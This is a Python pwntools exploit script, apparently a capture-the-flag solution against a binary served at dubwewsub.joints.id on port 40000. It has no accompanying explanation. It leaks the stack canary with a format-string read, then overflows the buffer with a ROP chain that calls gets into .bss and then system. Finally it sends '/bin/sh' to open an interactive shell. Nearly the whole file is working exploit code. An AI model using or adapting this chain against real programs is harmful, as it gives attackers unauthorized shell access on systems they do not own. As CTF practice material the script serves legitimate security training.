#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dubwewsub.joints.id --port 40000 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dubwewsub.joints.id'
port = int(args.PORT or 40000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

win = 0x00000000004011e8

p = '%11$p'
io.sendline(p)
io.recvuntil(" name: ")
data = int(io.recvline()[:-1],16)
print hex(data)

# p = 'a'*24
# p += p64(data)
# p += p64(data)
# p += p64(win)
# io.sendline(p)

p = 'a'*24
p += p64(data)
p += p64(data)
p += p64(exe.search(asm("pop rdi ; ret")).next())
p += p64(exe.bss()+0x100)
p += p64(exe.plt['gets'])
p += p64(exe.search(asm("pop rdi ; ret")).next())
p += p64(exe.bss()+0x100)
p += p64(exe.plt['system'])

io.sendline(p)

io.sendline("/bin/sh")



io.interactive()
